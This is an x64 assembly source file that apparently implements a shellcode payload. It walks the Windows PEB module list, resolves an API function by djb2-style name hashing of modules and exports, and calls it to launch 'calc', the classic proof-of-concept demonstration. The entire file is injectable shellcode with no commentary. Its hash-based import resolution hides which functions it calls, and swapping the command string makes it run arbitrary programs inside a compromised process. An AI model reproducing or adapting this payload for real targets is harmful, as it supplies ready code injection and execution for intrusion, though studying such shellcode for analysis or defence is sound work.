.code
public payload

payload:
int 3
push rax
push rbx
push rcx
push rdx
push rbp
push rsi
push rdi
push r8
push r9
push r10
push r11
push r12
push r13
push r14
push r15
mov     r11,rsp
sub     rsp,010h
sub     rsp,070h
sub     rsp,070h
and     sp,0fff0h
mov     eax,0636c6163h
mov dword ptr [rsp], eax
mov byte ptr [rsp+4], 00h
xor     eax,eax
mov     qword ptr [r11+8],rbx
lea     rdi,[r11-78h]
mov     qword ptr [r11+10h],rsi
mov     ecx,68h
xor     ebp,ebp
rep stos byte ptr [rdi]
mov     byte ptr [rsp+70h],68h
mov     eax,060h
mov     rax,qword ptr gs:[eax]
mov     rcx,qword ptr [rax+18h]
mov     r8,qword ptr [rcx+10h]
mov     rdi,qword ptr [r8+60h]
mov     r9,rdi
_00007ff6559b1047: test    rdi,rdi
je      _00007ff6559b107c
movzx   ecx,word ptr [rdi]
mov     eax,1505h
mov     edx,ebp
test    cx,cx
je      _00007ff6559b107c
nop     dword ptr [rax+rax]
_00007ff6559b1060: movzx   ecx,cx
inc     edx
imul    eax,eax,21h
add     eax,ecx
mov     ecx,edx
movzx   ecx,word ptr [rdi+rdx*2]
test    cx,cx
jne     _00007ff6559b1060
cmp     eax,6DDB9555h
je      _00007ff6559b10ae
_00007ff6559b107c: mov     r8,qword ptr [r8]
mov     rdi,qword ptr [r8+60h]
cmp     rdi,r9
jne     _00007ff6559b1047
_00007ff6559b1088: mov     eax,1
_00007ff6559b108d: lea rsp,[rsp+070h]
add rsp,070h
add rsp,018h
pop r15
pop r14
pop r13
pop r12
pop r11
pop r9
pop r8
pop rdi
pop rsi
pop rbp
pop rdx
pop rcx
pop rbx
pop rax
ret
_00007ff6559b10ae: mov     r10,qword ptr [r8+30h]
test    r10,r10
je      _00007ff6559b1088
movsxd  rax,dword ptr [r10+3Ch]
lea     rcx,[rax+r10]
add     rcx,070h
add     rcx,018h
mov     ecx,dword ptr [rcx]
test    ecx,ecx
je      _00007ff6559b1088
mov     r9d,dword ptr [r10+rcx+20h]
lea     rax,[r10+rcx]
mov     ebx,dword ptr [rax+24h]
add     r9,r10
mov     esi,dword ptr [rax+1Ch]
add     rbx,r10
mov     r11d,dword ptr [rax+18h]
add     rsi,r10
mov     r8d,ebp
test    r11d,r11d
je      _00007ff6559b1088
nop     dword ptr [rax+rax]
_00007ff6559b10f0: mov     edi,dword ptr [r9]
mov     ecx,1505h
add     rdi,r10
mov     edx,ebp
movzx   eax,byte ptr [rdi]
test    al,al
je      _00007ff6559b1120
_00007ff6559b1104: movsx   eax,al
inc     edx
imul    ecx,ecx,21h
add     ecx,eax
mov     eax,edx
movzx   eax,byte ptr [rdx+rdi]
test    al,al
jne     _00007ff6559b1104
push    rax
mov rax, rcx
cmp eax, 0AEB52E19h
pop rax
;cmp     ecx,0AEB52E19h
je      _00007ff6559b1131
_00007ff6559b1120: inc     r8d
add     r9,4
cmp     r8d,r11d
jb      _00007ff6559b10f0
jmp     _00007ff6559b1088
_00007ff6559b1131: mov     eax,r8d
movzx   ecx,word ptr [rbx+rax*2]
mov     eax,dword ptr [rsi+rcx*4]
add     rax,r10
je      _00007ff6559b1088
lea     rcx,[rsp+010h]
xor     r9d,r9d
mov     qword ptr [rsp+48h],rcx
lea     rdx,[rsp]
lea     rcx,[rsp+70h]
add     rcx,10h
xor     r8d,r8d
mov     qword ptr [rsp+40h],rcx
xor     ecx,ecx
mov     qword ptr [rsp+38h],rbp
mov     qword ptr [rsp+30h],rbp
mov     dword ptr [rsp+28h],ebp
mov     dword ptr [rsp+20h],ebp
call    rax
xor     eax,eax
jmp     _00007ff6559b108d

end